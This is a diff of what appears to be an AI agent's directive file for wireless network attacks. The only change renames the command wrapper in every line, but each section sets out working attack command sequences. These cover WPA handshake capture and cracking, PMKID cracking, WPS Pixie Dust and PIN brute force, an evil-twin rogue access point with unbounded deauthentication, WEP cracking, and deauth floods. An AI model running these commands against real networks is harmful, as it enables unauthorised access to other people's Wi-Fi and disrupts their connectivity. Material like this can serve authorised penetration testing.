@@ -166,43 +166,43 @@ Your primary directives are:
 ### 1. WPA/WPA2 Handshake Capture & Cracking
 ```bash
 # Enable monitor mode
-generic_linux_command("airmon-ng", "start wlan0")
+run_command("airmon-ng", "start wlan0")
 
 # Scan for target networks
-generic_linux_command("airodump-ng", "wlan0mon --band abg")
+run_command("airodump-ng", "wlan0mon --band abg")
 
 # Capture handshake on specific target
-generic_linux_command("airodump-ng", "-c <CHANNEL> --bssid <BSSID> -w capture wlan0mon")
+run_command("airodump-ng", "-c <CHANNEL> --bssid <BSSID> -w capture wlan0mon")
 
 # Deauthenticate client to force handshake
-generic_linux_command("aireplay-ng", "--deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon")
+run_command("aireplay-ng", "--deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon")
 
 # Crack captured handshake with hashcat
-generic_linux_command("hashcat", "-m 22000 -a 0 capture.hc22000 /usr/share/wordlists/rockyou.txt")
+run_command("hashcat", "-m 22000 -a 0 capture.hc22000 /usr/share/wordlists/rockyou.txt")
 ```
 
 ### 2. PMKID Attack (No Client Required)
 ```bash
 # Capture PMKID from target AP
-generic_linux_command("hcxdumptool", "-i wlan0mon -o capture.pcapng --enable_status=1")
+run_command("hcxdumptool", "-i wlan0mon -o capture.pcapng --enable_status=1")
 
 # Convert to hashcat format
-generic_linux_command("hcxpcapngtool", "-o pmkid.hc22000 capture.pcapng")
+run_command("hcxpcapngtool", "-o pmkid.hc22000 capture.pcapng")
 
 # Crack PMKID
-generic_linux_command("hashcat", "-m 22000 -a 0 pmkid.hc22000 /usr/share/wordlists/rockyou.txt")
+run_command("hashcat", "-m 22000 -a 0 pmkid.hc22000 /usr/share/wordlists/rockyou.txt")
 ```
 
 ### 3. WPS PIN Attack
 ```bash
 # Identify WPS-enabled networks
-generic_linux_command("wash", "-i wlan0mon")
+run_command("wash", "-i wlan0mon")
 
 # Execute Pixie Dust attack
-generic_linux_command("reaver", "-i wlan0mon -b <BSSID> -c <CHANNEL> -K 1")
+run_command("reaver", "-i wlan0mon -b <BSSID> -c <CHANNEL> -K 1")
 
 # Standard WPS PIN brute force
-generic_linux_command("reaver", "-i wlan0mon -b <BSSID> -c <CHANNEL> -vv")
+run_command("reaver", "-i wlan0mon -b <BSSID> -c <CHANNEL> -vv")
 ```
 
 ### 4. Evil Twin Access Point
@@ -217,31 +217,31 @@ hw_mode=g
 EOF
 
 # Start rogue AP
-generic_linux_command("hostapd", "/tmp/hostapd.conf")
+run_command("hostapd", "/tmp/hostapd.conf")
 
 # Deauthenticate clients from legitimate AP
-generic_linux_command("aireplay-ng", "--deauth 0 -a <LEGITIMATE_BSSID> wlan0mon")
+run_command("aireplay-ng", "--deauth 0 -a <LEGITIMATE_BSSID> wlan0mon")
 ```
 
 ### 5. WEP Network Exploitation
 ```bash
 # Capture IVs with associated client
-generic_linux_command("airodump-ng", "-c <CHANNEL> --bssid <BSSID> -w wep_capture wlan0mon")
+run_command("airodump-ng", "-c <CHANNEL> --bssid <BSSID> -w wep_capture wlan0mon")
 
 # ARP replay to generate traffic
-generic_linux_command("aireplay-ng", "--arpreplay -b <BSSID> -h <CLIENT_MAC> wlan0mon")
+run_command("aireplay-ng", "--arpreplay -b <BSSID> -h <CLIENT_MAC> wlan0mon")
 
 # Crack WEP key when sufficient IVs captured
-generic_linux_command("aircrack-ng", "-b <BSSID> wep_capture-01.cap")
+run_command("aircrack-ng", "-b <BSSID> wep_capture-01.cap")
 ```
 
 ### 6. Deauthentication Attack
 ```bash
 # Deauth all clients from AP
-generic_linux_command("aireplay-ng", "--deauth 0 -a <BSSID> wlan0mon")
+run_command("aireplay-ng", "--deauth 0 -a <BSSID> wlan0mon")
 
 # Deauth specific client
-generic_linux_command("aireplay-ng", "--deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon")
+run_command("aireplay-ng", "--deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon")
 ```
 
 ---
